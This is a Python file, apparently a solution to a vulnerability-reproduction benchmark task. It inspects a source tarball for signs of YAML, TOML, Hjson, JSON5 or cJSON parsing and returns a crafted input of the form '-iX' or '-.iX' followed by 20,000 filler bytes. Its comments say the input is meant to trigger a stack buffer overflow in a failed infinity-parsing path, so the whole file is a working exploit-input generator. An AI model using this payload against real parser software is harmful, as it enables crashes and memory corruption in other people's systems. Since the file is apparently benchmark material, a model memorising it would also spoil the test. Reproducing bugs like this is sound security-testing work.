import os
import tarfile

class Solution:
    def solve(self, src_path: str) -> bytes:
        def scan_tar_for_keywords(tar_path):
            keywords = {
                'yaml': False,
                'hjson': False,
                'toml': False,
                'json5': False,
                'cjson': False,
                'infinity': False,
                'dot_inf': False,
            }
            try:
                with tarfile.open(tar_path, 'r:*') as tf:
                    for m in tf.getmembers():
                        name_low = m.name.lower()
                        if any(name_low.endswith(ext) for ext in ('.c', '.h', '.cc', '.cpp', '.txt', '.md', '.py', 'cmakelists.txt', 'configure', 'meson.build', 'meson_options.txt')):
                            if 'yaml' in name_low:
                                keywords['yaml'] = True
                            if 'hjson' in name_low:
                                keywords['hjson'] = True
                            if 'toml' in name_low:
                                keywords['toml'] = True
                            if 'json5' in name_low:
                                keywords['json5'] = True
                            if 'cjson' in name_low or 'c-json' in name_low:
                                keywords['cjson'] = True

                        if not m.isfile():
                            continue
                        # Limit size read for speed
                        if m.size > 2_000_000:
                            continue
                        f = tf.extractfile(m)
                        if not f:
                            continue
                        try:
                            data = f.read()
                        except Exception:
                            continue
                        data_low = data.lower()
                        if not keywords['yaml'] and b'libyaml' in data_low:
                            keywords['yaml'] = True
                        if not keywords['hjson'] and b'hjson' in data_low:
                            keywords['hjson'] = True
                        if not keywords['toml'] and b'toml' in data_low:
                            keywords['toml'] = True
                        if not keywords['json5'] and b'json5' in data_low:
                            keywords['json5'] = True
                        if not keywords['cjson'] and (b'cjson' in data_low or b'c-json' in data_low):
                            keywords['cjson'] = True
                        if b'infinity' in data_low or b'inf' in data_low:
                            keywords['infinity'] = True
                        if b'.inf' in data_low or b'-.inf' in data_low:
                            keywords['dot_inf'] = True
            except Exception:
                pass
            return keywords

        info = scan_tar_for_keywords(src_path)

        # Choose payload based on detected project characteristics
        # Large filler to trigger stack buffer overflow when parser mistakenly advances
        # from '-' in a failed infinity parse path.
        if info.get('yaml') or info.get('dot_inf'):
            # YAML often uses .inf/.nan; craft a non-infinity starting with "-.i"
            filler = b'A' * 20000
            payload = b"-.iX" + filler + b"\n"
            return payload
        elif info.get('toml'):
            # TOML uses inf/nan literals; provide within a key/value
            filler = b'9' * 20000
            payload = b"key = -iX" + filler + b"\n"
            return payload
        elif info.get('hjson') or info.get('json5') or info.get('cjson') or info.get('infinity'):
            # Hjson/JSON5/cJSON may recognize Infinity; start with "-i" but break match
            filler = b'Z' * 20000
            payload = b"-iX" + filler
            return payload
        else:
            # Generic fallback for text-based parsers that might attempt infinity parsing
            filler = b'Q' * 20000
            payload = b"-iX" + filler
            return payload
